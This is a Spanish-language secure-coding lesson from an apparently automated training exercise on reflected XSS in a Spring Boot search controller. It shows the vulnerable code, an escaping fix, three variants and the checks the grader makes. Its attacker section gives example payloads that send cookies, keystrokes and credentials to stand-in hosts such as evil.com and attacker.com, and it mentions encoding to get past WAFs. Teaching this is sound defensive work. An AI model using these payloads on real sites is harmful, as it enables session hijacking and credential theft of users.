# Paso 24 — XSS Reflected
**Tecnologia:** Java / Spring Boot | **OWASP:** A03:2021 - Injection | **CWE-79**

---

## Que es esta vulnerabilidad?

Cross-Site Scripting (XSS) Reflected ocurre cuando una aplicacion incluye input del usuario directamente en la respuesta HTML sin escapar los caracteres especiales de HTML. El script malicioso "rebota" en el servidor: el atacante envia una URL con un payload a la victima, la victima hace click, el servidor devuelve la URL con el script, y el navegador de la victima lo ejecuta.

A diferencia del XSS Stored (donde el payload se persiste en la base de datos), el XSS Reflected requiere que la victima siga un enlace manipulado. El atacante lo distribuye via email, mensajes, redes sociales o campanas de phishing. Cuando la victima hace click, el JavaScript del atacante se ejecuta en el contexto del sitio web de la empresa — con acceso completo a cookies, tokens de sesion, datos de formularios y DOM.

XSS es la vulnerabilidad mas reportada historicamente en programas de bug bounty. En aplicaciones bancarias, medicas o de comercio electronico, el impacto puede ser critico: robo de sesion, phishing dentro del dominio legitimo, keylogging de formularios de pago.

---

## Donde ocurre en este codigo?

**Archivo:** `src/java/src/main/java/com/example/api/controller/SearchController.java`

```java
// CODIGO VULNERABLE — estado actual del ejercicio
@GetMapping("/search")
@ResponseBody
public String search(@RequestParam String q) {
    return "<html><body><h2>Resultados para: " + q + "</h2></body></html>";
}
```

Con `q = "laptop"`, la respuesta es HTML inerte.  
Con `q = "<script>alert(document.cookie)</script>"`, la respuesta es:
```html
<html><body><h2>Resultados para: <script>alert(document.cookie)</script></h2></body></html>
```
El navegador ejecuta el script porque forma parte del DOM de la respuesta del servidor.

---

## Como lo explotaria un atacante

**URL con payload para enviar a victima:**
```
https://empresa.com/api/xss/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

**Payload para robar cookies de sesion:**
```javascript
// El atacante redirige la victima a su servidor con las cookies
document.location='https://attacker.com/collect?session='+document.cookie
```

**Payload para keylogging de formularios:**
```javascript
// Intercepta todos los campos de formulario que el usuario escribe
document.addEventListener('keypress', e => {
    fetch('https://attacker.com/log?k='+e.key);
});
```

**Payload para phishing dentro del dominio legitimo:**
```javascript
// Modifica el DOM para mostrar un formulario falso de login
document.body.innerHTML = '<form action="https://attacker.com/creds"><input name="user"><input type="password" name="pass"><button>Login</button></form>';
```

La URL con el payload puede ser codificada en Base64 o URL-encoded para evadir filtros de WAF:
```
?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

---

## Tu tarea: aplicar la mitigacion

Modifica `src/java/src/main/java/com/example/api/controller/SearchController.java` para escapar el output con `HtmlUtils.htmlEscape`:

```java
// CODIGO SEGURO
package com.example.api.controller;

import org.springframework.web.bind.annotation.*;
import org.springframework.web.util.HtmlUtils;

@RestController
@RequestMapping("/api/xss")
public class SearchController {

    @GetMapping("/search")
    @ResponseBody
    public String search(@RequestParam String q) {
        // HtmlUtils.htmlEscape convierte los metacaracteres HTML en entidades:
        // < → &lt;   > → &gt;   " → &quot;   & → &amp;   ' → &#x27;
        String safeQ = HtmlUtils.htmlEscape(q);
        return "<html><body><h2>Resultados para: " + safeQ + "</h2></body></html>";
    }
}
```

Con `q = "<script>alert(1)</script>"`, `htmlEscape` produce:
```
&lt;script&gt;alert(1)&lt;/script&gt;
```
El navegador muestra el texto literal `<script>alert(1)</script>` sin ejecutarlo.

### Por que funciona esta mitigacion?

- **`HtmlUtils.htmlEscape`:** convierte `<`, `>`, `"`, `&`, `'` en sus entidades HTML equivalentes. Estas entidades son texto inerte para el navegador: se muestran como caracteres pero no se interpretan como codigo HTML/JavaScript.
- **Escapado en el punto de salida:** la mitigacion ocurre justo antes de insertar el dato en el HTML. Si el dato pasa por multiples sistemas antes de ser renderizado, el escapado en la salida garantiza que el ultimo paso es siempre seguro.
- **Content-Type correcto:** ademas del escape, el response debe tener `Content-Type: text/html; charset=UTF-8`. Un `Content-Type: text/plain` evita XSS aunque el HTML no este escapado, porque el navegador no lo interpretaria como HTML.
- **Content-Security-Policy como segunda linea:** la cabecera `Content-Security-Policy: default-src 'self'` instruye al navegador a no ejecutar scripts inline aunque el escape falle, proporcionando defensa en profundidad.

---

## Variantes de la misma categoria (XSS — distintos contextos de inyeccion)

### Variante A: XSS en atributo HTML (sin tags)

```java
// VULNERABLE — input en atributo HTML; htmlEscape no es suficiente en algunos contextos
@GetMapping("/user-profile")
@ResponseBody
public String profile(@RequestParam String name) {
    // Si name = '" onmouseover="alert(1)
    // El atributo value queda: value="" onmouseover="alert(1)"
    return "<input type='text' value='" + name + "'>";
}
```

```java
// SEGURO — escapar siempre tanto < > como comillas dentro de atributos
import org.springframework.web.util.HtmlUtils;

@GetMapping("/user-profile")
@ResponseBody
public String profile(@RequestParam String name) {
    String safe = HtmlUtils.htmlEscape(name);  // escapa " y ' tambien
    return "<input type='text' value='" + safe + "'>";
}
// Mejor aun: usar Thymeleaf con th:value="${name}" que escapa automaticamente
```

---

### Variante B: DOM-based XSS (el payload nunca llega al servidor)

```javascript
// VULNERABLE — JavaScript que lee el fragment (#) de la URL y lo inserta en el DOM
// El fragment (#) NO se envia al servidor, por lo que WAF y logs del servidor no lo ven
const query = location.hash.substring(1);  // "#<img src=x onerror=alert(1)>"
document.getElementById('search-results').innerHTML = query;  // XSS DOM
```

URL del atacante: `https://empresa.com/search#<img src=x onerror=alert(document.cookie)>`

```javascript
// SEGURO — usar textContent en lugar de innerHTML; o DOMPurify para HTML complejo
const query = location.hash.substring(1);

// Para texto plano:
document.getElementById('search-results').textContent = query;  // no interpreta HTML

// Para HTML que necesita formato (negritas, enlaces):
import DOMPurify from 'dompurify';
document.getElementById('search-results').innerHTML = DOMPurify.sanitize(query);
```

---

### Variante C: XSS en contexto JSON (JavaScript Object Injection)

```java
// VULNERABLE — insertar JSON en un script tag directamente
@GetMapping("/config")
@ResponseBody
public String getConfig(@RequestParam String theme) {
    // Si theme contiene </script><script>alert(1)</script>
    return "<script>var config = {\"theme\": \"" + theme + "\"};</script>";
}
```

Aunque se use dentro de `<script>`, el string `</script>` cierra el tag y permite inyectar nuevo HTML.

```java
// SEGURO — usar Jackson para serializar JSON; Jackson escapa <, >, / por defecto
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.core.JsonProcessingException;

@GetMapping("/config")
@ResponseBody
public String getConfig(@RequestParam String theme) throws JsonProcessingException {
    ObjectMapper mapper = new ObjectMapper();
    String safeJson = mapper.writeValueAsString(Map.of("theme", theme));
    // Jackson escapa / como \/ y < como \u003c por defecto, previniendo </script>
    return "<script>var config = " + safeJson + ";</script>";
}
```

---

## Referencias

- [OWASP A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP DOM-based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)

---

## Lo que valida el workflow automaticamente

El workflow **Validate Step 24** exige que `src/java/src/main/java/com/example/api/controller/SearchController.java` contenga:
- `HtmlUtils.htmlEscape(q)`
- La ausencia de `+ q + "</h2></body></html>"`
